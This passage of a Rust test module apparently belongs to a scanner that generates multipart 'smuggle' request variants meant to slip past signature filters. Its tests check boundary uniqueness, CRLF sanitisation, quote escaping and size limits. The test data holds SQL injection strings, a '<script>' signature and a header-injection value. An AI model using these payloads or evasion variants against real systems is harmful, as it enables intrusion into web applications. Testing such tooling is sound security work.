        let params = vec![("u".to_string(), "admin' OR 1=1--".to_string())];
        let params = Arc::new(params);
        let threads: Vec<_> = (0..50)
            .map(|_| {
                let bodies = Arc::clone(&bodies);
                let params = Arc::clone(&params);
                thread::spawn(move || {
                    let v = generate_smuggle_variants(&params);
                    let preamble = v
                        .iter()
                        .find(|x| x.technique == ContentTypeTechnique::MultipartPreambleSmuggle)
                        .expect("preamble present");
                    bodies.lock().unwrap().insert(preamble.body.clone());
                })
            })
            .collect();
        for t in threads {
            t.join().expect("thread panicked");
        }
        // Each call uses unique_boundary() — all 50 bodies must differ
        // because the boundary is part of the body content.
        assert_eq!(
            bodies.lock().unwrap().len(),
            50,
            "concurrent generation must produce 50 distinct preamble bodies"
        );
    }

    #[test]
    fn with_config_empty_preamble_body_does_not_start_with_script_tag() {
        // Cross-pool independence: zeroing preamble_signature must not
        // affect epilogue_signature and vice versa.
        let config_no_pre = SmuggleProbeConfig {
            preamble_signature: Vec::new(),
            epilogue_signature: DEFAULT_EPILOGUE_SIGNATURE.to_vec(),
        };
        let v = generate_smuggle_variants_with_config(&sample_params(), &config_no_pre);
        let pre = v
            .iter()
            .find(|x| x.technique == ContentTypeTechnique::MultipartPreambleSmuggle)
            .unwrap();
        // Preamble is empty — no script tag
        assert!(!pre.body.windows(8).any(|w| w == b"<script>"));
        // Epilogue must still carry its default signature
        let epi = v
            .iter()
            .find(|x| x.technique == ContentTypeTechnique::MultipartEpilogueSmuggle)
            .unwrap();
        assert!(
            epi.body
                .windows(b"union select".len())
                .any(|w| w == b"union select"),
            "epilogue signature must be independent of preamble being empty"
        );
    }

    #[test]
    fn neutral_field_name_pool_has_at_least_eight_entries() {
        // Anti-rig: if the pool shrinks to one entry, the per-call
        // "randomness" collapses and signature-defeating property is
        // lost. Pin a minimum cardinality.
        assert!(
            NEUTRAL_FIELD_NAME_POOL.len() >= 8,
            "NEUTRAL_FIELD_NAME_POOL must have >=8 entries for adequate field-name entropy"
        );
    }

    #[test]
    fn nested_envelope_body_contains_no_utf8_replacement_chars() {
        // Regression test for the from_utf8_lossy bug: the nested-envelope
        // builder previously used String::from_utf8_lossy which silently
        // replaced invalid bytes with U+FFFD (0xEF 0xBF 0xBD in UTF-8).
        // After the fix (String::from_utf8 strict), the body must contain
        // no replacement char bytes for any well-formed param set.
        let params = vec![
            ("user".to_string(), "admin".to_string()),
            ("q".to_string(), "' OR 1=1 --".to_string()),
        ];
        let v = generate_smuggle_variants(&params);
        let nested = v
            .iter()
            .find(|x| x.technique == ContentTypeTechnique::MultipartNestedEnvelope)
            .expect("nested envelope variant present");
        // U+FFFD encoded as UTF-8 is 0xEF 0xBF 0xBD.
        let replacement = &[0xEFu8, 0xBFu8, 0xBDu8];
        assert!(
            !nested.body.windows(3).any(|w| w == replacement),
            "nested envelope body must not contain UTF-8 replacement chars (from_utf8_lossy regression)"
        );
    }

    #[test]
    fn nested_envelope_inner_boundary_present_even_with_empty_params() {
        // Boundary: empty params — the nested variant must still produce
        // a structurally valid outer/inner frame. The fallback path in the
        // from_utf8 fix must not silently drop the inner part.
        let v = generate_smuggle_variants(&[]);
        let nested = v
            .iter()
            .find(|x| x.technique == ContentTypeTechnique::MultipartNestedEnvelope)
            .expect("nested envelope variant with empty params");
        // The outer frame must have a closing --outer-- delimiter.
        let body_str = std::str::from_utf8(&nested.body).expect("valid utf-8 body");
        assert!(
            body_str.contains("Content-Type: multipart/mixed"),
            "nested body must carry inner Content-Type header"
        );
        // Both the outer closing `--outer--` and the inner boundary must appear.
        let closes: Vec<_> = body_str.match_indices("--\r\n").collect();
        assert!(
            !closes.is_empty(),
            "nested envelope must have at least one closing delimiter, got {}",
            closes.len()
        );
    }

    #[test]
    fn params_with_values_containing_lf_are_sanitised_in_lf_only_variant() {
        // CRLF injection: param values containing CR or LF must be stripped
        // in the LF-only delimiter variant so the intentional bare-LF
        // framing isn't polluted by stray newlines from attacker-supplied data.
        // The sanitisation removes CR and LF chars from values — it does NOT
        // blank non-CRLF characters. What must not survive is a header-injection
        // sequence: the CRLF prefix needed to inject an extra header line.
        let params = vec![("k".to_string(), "val\r\nevil_header: injected".to_string())];
        let v = generate_smuggle_variants(&params);
        let lf = v
            .iter()
            .find(|x| x.technique == ContentTypeTechnique::MultipartLfOnlyDelimiters)
            .expect("LF-only variant present");
        let body_str = String::from_utf8_lossy(&lf.body);
        // The body itself uses \n for intentional framing; no \r must appear at all.
        assert!(
            !lf.body.contains(&b'\r'),
            "CRLF sanitisation must strip all \\r from the LF-only body"
        );
        // The injected header injection requires \n before the header name.
        // With the \r\n stripped, "evil_header" cannot appear as a header line.
        assert!(
            !body_str.contains("\nevil_header:"),
            "stripped CRLF must not allow header-injection via \\nevil_header:"
        );
    }

    #[test]
    fn lf_only_variant_escapes_quote_in_param_key() {
        // Regression: the LF-only delimiter variant previously hand-rolled
        // `key.replace(['\r','\n'], "")`, which (unlike the shared
        // build_multipart_body) did NOT backslash-escape quotes. A param
        // KEY containing `"` would terminate the `name="..."` value early
        // and forge the Content-Disposition header. After routing through
        // the canonical safe_multipart_name, the quote must appear escaped
        // (\") and must NOT appear as a bare quote that closes name=.
        let params = vec![("ev\"il".to_string(), "v".to_string())];
        let v = generate_smuggle_variants(&params);
        let lf = v
            .iter()
            .find(|x| x.technique == ContentTypeTechnique::MultipartLfOnlyDelimiters)
            .expect("LF-only variant present");
        let body_str = std::str::from_utf8(&lf.body).expect("utf-8 body");
        // The escaped form (name="ev\"il") must be present...
        assert!(
            body_str.contains(r#"name="ev\"il""#),
            "LF-only variant must backslash-escape a quote in the param key: {body_str:?}"
        );
        // ...and the unescaped early-terminating form (name="ev"il) must NOT.
        assert!(
            !body_str.contains(r#"name="ev"il"#),
            "LF-only variant must not leave a bare quote that terminates name= early: {body_str:?}"
        );
    }

    #[test]
    fn max_smuggle_region_bytes_is_sane_upper_bound() {
        // Anti-rig: if someone raises MAX_SMUGGLE_REGION_BYTES to
        // a multi-MB value, the preamble/epilogue variants become
        // megabyte-amplifiers. Pin a ceiling.
        assert!(
            MAX_SMUGGLE_REGION_BYTES <= 64 * 1024,
            "MAX_SMUGGLE_REGION_BYTES={} exceeds 64KB safety ceiling; \
             raising this makes the smuggle pipeline a memory amplifier",
            MAX_SMUGGLE_REGION_BYTES
        );
    }
}
